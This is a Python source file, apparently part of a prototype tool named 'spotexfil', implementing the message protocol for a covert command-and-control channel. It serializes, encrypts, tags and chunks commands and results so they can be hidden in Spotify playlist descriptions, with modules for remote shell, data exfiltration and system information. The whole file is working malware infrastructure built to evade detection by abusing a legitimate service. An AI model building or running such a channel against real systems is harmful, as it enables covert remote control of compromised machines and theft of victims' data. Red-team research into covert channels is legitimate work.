"""protocol.py - C2 message serialization, encoding, and chunking.

Adapts the existing Subcipher encryption pipeline for in-memory
JSON messages. All playlist descriptions are fully encrypted --
no plaintext metadata is exposed.

Playlist description format:
    <c2_tag_12hex> + <base64(AES-GCM(meta+chunk))>

The c2_tag is an HMAC-derived identifier that allows fast filtering
without decrypting every playlist on the account.

Constants are loaded from shared/protocol.json for cross-language
consistency.
"""

import base64
import hashlib
import hmac
import json
import os
import time
from pathlib import Path

from .crypto import Subcipher, compute_blake2b
from .transport import CHUNK_SIZE  # noqa: F401

__author__ = '@sourcefrenchy'
__email__ = 'jmamblat@icloud.com'
__status__ = 'PROTOTYPE'

# Load constants from shared protocol spec
_PROTO_PATH = Path(__file__).resolve().parent.parent.parent / 'shared' / 'protocol.json'
with open(_PROTO_PATH) as _f:
    _PROTO = json.load(_f)

# Channel discriminators (encrypted inside payloads, never plaintext)
CHANNEL_CMD = _PROTO['c2']['channel_cmd']
CHANNEL_RES = _PROTO['c2']['channel_res']

# C2 tag length (hex chars prepended to description for identification)
C2_TAG_LEN = _PROTO['c2']['tag_len']

# Encrypted description overhead
C2_EFFECTIVE_CHUNK = _PROTO['c2']['effective_chunk']


def compute_c2_tag(encryption_key: str) -> str:
    """Derive a time-windowed 12-char hex tag from the encryption key.

    The tag rotates every hour: tag = HMAC-SHA256(key, floor(epoch/3600))[:12].
    Use this for WRITE operations (current window only).

    Args:
        encryption_key: Shared passphrase.

    Returns:
        12-character hex string.
    """
    import struct
    window = int(time.time()) // 3600
    window_bytes = struct.pack('>Q', window)
    h = hmac.new(
        encryption_key.encode('utf-8'),
        window_bytes,
        hashlib.sha256,
    )
    return h.hexdigest()[:C2_TAG_LEN]


def compute_c2_tags(encryption_key: str) -> list:
    """Return [current, previous] hour-window tags for READ operations.

    Checking both windows handles clock skew at the hour boundary.

    Args:
        encryption_key: Shared passphrase.

    Returns:
        List of two 12-character hex strings [current, previous].
    """
    import struct
    now = int(time.time()) // 3600
    tags = []
    for window in (now, now - 1):
        window_bytes = struct.pack('>Q', window)
        h = hmac.new(
            encryption_key.encode('utf-8'),
            window_bytes,
            hashlib.sha256,
        )
        tags.append(h.hexdigest()[:C2_TAG_LEN])
    return tags


def _derive_meta_key(encryption_key: str) -> bytes:
    """Derive a fast AES key for metadata encryption.

    Uses HMAC instead of PBKDF2 to avoid per-playlist KDF cost.

    Args:
        encryption_key: Shared passphrase.

    Returns:
        32-byte AES key.
    """
    h = hmac.new(
        encryption_key.encode('utf-8'),
        b"spotexfil-c2-meta-key",
        hashlib.sha256,
    )
    return h.digest()


def _encrypt_chunk_desc(meta: dict, chunk_data: str,
                        encryption_key: str) -> str:
    """Encrypt metadata + chunk data into a playlist description.

    Format: c2_tag(12 hex) + base64(AES-GCM(json({meta, data})))

    Args:
        meta: Metadata dict with c, i, seq fields.
        chunk_data: The Base64 payload chunk.
        encryption_key: Shared passphrase.

    Returns:
        Encrypted description string that fits in CHUNK_SIZE.
    """
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    tag = compute_c2_tag(encryption_key)
    key = _derive_meta_key(encryption_key)

    envelope = json.dumps(
        {"m": meta, "d": chunk_data},
        separators=(',', ':'),
    ).encode('utf-8')

    nonce = os.urandom(12)
    aesgcm = AESGCM(key)
    ciphertext = aesgcm.encrypt(nonce, envelope, None)

    encrypted_b64 = base64.b64encode(nonce + ciphertext).decode('utf-8')
    return tag + encrypted_b64


def _decrypt_chunk_desc(description: str,
                        encryption_key: str) -> tuple:
    """Decrypt a playlist description to extract metadata and chunk.

    Args:
        description: Encrypted description (tag + encrypted b64).
        encryption_key: Shared passphrase.

    Returns:
        Tuple of (metadata_dict, chunk_data_str).

    Raises:
        ValueError: If tag doesn't match or decryption fails.
    """
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    tags = compute_c2_tags(encryption_key)
    actual_tag = description[:C2_TAG_LEN]
    if actual_tag not in tags:
        raise ValueError("C2 tag mismatch")

    encrypted_b64 = description[C2_TAG_LEN:]
    raw = base64.b64decode(encrypted_b64)

    nonce = raw[:12]
    ciphertext = raw[12:]

    key = _derive_meta_key(encryption_key)
    aesgcm = AESGCM(key)
    plaintext = aesgcm.decrypt(nonce, ciphertext, None)

    envelope = json.loads(plaintext.decode('utf-8'))
    return envelope["m"], envelope["d"]


class C2Message:
    """Represents a C2 command or result message.

    Commands have: module, seq, args
    Results have: module, seq, status, data
    """

    def __init__(self, module: str, seq: int,
                 args: dict = None, status: str = None,
                 data: str = None):
        """Initialize a C2 message.

        Args:
            module: Module name (shell, exfil, sysinfo).
            seq: Sequence number for ordering and matching.
            args: Command arguments (commands only).
            status: Execution status 'ok' or 'error' (results only).
            data: Result data string (results only).
        """
        self.module = module
        self.seq = seq
        self.args = args or {}
        self.status = status
        self.data = data
        self.ts = time.time()

    def to_command_dict(self) -> dict:
        """Serialize as a command dict for transmission."""
        return {
            "module": self.module,
            "args": self.args,
            "seq": self.seq,
            "ts": self.ts,
        }

    def to_result_dict(self) -> dict:
        """Serialize as a result dict for transmission."""
        return {
            "seq": self.seq,
            "module": self.module,
            "status": self.status,
            "data": self.data,
            "ts": self.ts,
        }

    @classmethod
    def from_command_dict(cls, d: dict) -> 'C2Message':
        """Deserialize a command dict."""
        msg = cls(
            module=d["module"],
            seq=d["seq"],
            args=d.get("args", {}),
        )
        msg.ts = d.get("ts", time.time())
        return msg

    @classmethod
    def from_result_dict(cls, d: dict) -> 'C2Message':
        """Deserialize a result dict."""
        msg = cls(
            module=d["module"],
            seq=d["seq"],
            status=d.get("status"),
            data=d.get("data"),
        )
        msg.ts = d.get("ts", time.time())
        return msg


def encode_message(message_dict: dict, encryption_key: str) -> str:
    """Encode a message dict into an encrypted Base64 string.

    Pipeline: JSON -> UTF-8 -> compress -> BLAKE2b -> AES-GCM -> Base64

    Args:
        message_dict: Command or result dict to encode.
        encryption_key: AES-256-GCM passphrase.

    Returns:
        Base64-encoded encrypted string.
    """
    cipher = Subcipher(spot=None, encryption_key=encryption_key)
    plaintext = json.dumps(message_dict).encode('utf-8')
    checksum = compute_blake2b(plaintext)
    data = cipher._compress(plaintext)
    hash_bytes = checksum.encode('utf-8')
    hash_len = len(hash_bytes).to_bytes(2, 'big')
    data_to_encrypt = hash_len + hash_bytes + data
    encrypted = cipher._encrypt(data_to_encrypt)
    return base64.b64encode(encrypted).decode('utf-8')


def decode_message(b64_payload: str, encryption_key: str) -> dict:
    """Decode an encrypted Base64 string back to a message dict.

    Reverses encode_message. Verifies BLAKE2b integrity.

    Args:
        b64_payload: Base64-encoded encrypted string.
        encryption_key: AES-256-GCM passphrase (must match).

    Returns:
        Decoded message dict.

    Raises:
        ValueError: If integrity check fails or decryption fails.
    """
    cipher = Subcipher(spot=None, encryption_key=encryption_key)
    raw = base64.b64decode(b64_payload)
    decrypted = cipher._decrypt(raw)
    hash_len = int.from_bytes(decrypted[:2], 'big')
    stored_hash = decrypted[2:2 + hash_len].decode('utf-8')
    compressed = decrypted[2 + hash_len:]
    plaintext = cipher._decompress(compressed)
    actual_hash = compute_blake2b(plaintext)
    if stored_hash != actual_hash:
        raise ValueError("C2 message integrity check failed")
    return json.loads(plaintext.decode('utf-8'))


def chunk_payload(b64_payload: str, seq: int,
                  channel: str, encryption_key: str) -> list:
    """Split encoded payload into fully encrypted playlist descriptions.

    Each description = c2_tag + encrypted(metadata + chunk_data).
    No plaintext metadata is exposed.

    Args:
        b64_payload: Base64-encoded encrypted payload.
        seq: Sequence number for this message.
        channel: Channel discriminator (CHANNEL_CMD or CHANNEL_RES).
        encryption_key: Passphrase for metadata encryption.

    Returns:
        List of encrypted description strings.
    """
    descriptions = []
    if len(b64_payload) <= C2_EFFECTIVE_CHUNK:
        meta = {"c": channel, "i": 1, "seq": seq}
        desc = _encrypt_chunk_desc(meta, b64_payload, encryption_key)
        descriptions.append(desc)
    else:
        parts = [
            b64_payload[i:i + C2_EFFECTIVE_CHUNK]
            for i in range(0, len(b64_payload), C2_EFFECTIVE_CHUNK)
        ]
        for idx, part in enumerate(parts, start=1):
            meta = {"c": channel, "i": idx, "seq": seq}
            desc = _encrypt_chunk_desc(meta, part, encryption_key)
            descriptions.append(desc)
    return descriptions


def read_c2_descriptions(descriptions: list,
                         encryption_key: str,
                         channel: str = None,
                         seq: int = None) -> dict:
    """Decrypt and filter C2 playlist descriptions.

    Attempts to decrypt each description. Non-C2 playlists or
    wrong-key descriptions are silently skipped.

    Args:
        descriptions: List of (playlist_id, raw_description) tuples.
        encryption_key: Passphrase for decryption.
        channel: If set, filter by this channel.
        seq: If set, filter by this sequence number.

    Returns:
        Dict mapping seq -> list of (chunk_data, metadata_dict) tuples.
    """
    tags = compute_c2_tags(encryption_key)
    seq_groups = {}

    for pl_id, desc in descriptions:
        # Fast tag check (current or previous hour window)
        if not any(desc.startswith(t) for t in tags):
            continue

        try:
            meta, chunk_data = _decrypt_chunk_desc(desc, encryption_key)
        except Exception:
            continue

        if channel and meta.get('c') != channel:
            continue
        msg_seq = meta.get('seq')
        if seq is not None and msg_seq != seq:
            continue

        if msg_seq not in seq_groups:
            seq_groups[msg_seq] = []
        seq_groups[msg_seq].append((chunk_data, meta))

    return seq_groups


def reassemble_payload(chunk_metas: list) -> str:
    """Reassemble chunks sorted by index into a single Base64 payload.

    Args:
        chunk_metas: List of (chunk_data, metadata_dict) tuples.

    Returns:
        Concatenated Base64 payload string.
    """
    sorted_chunks = sorted(chunk_metas, key=lambda x: x[1].get('i', 0))
    return ''.join(c[0] for c in sorted_chunks)
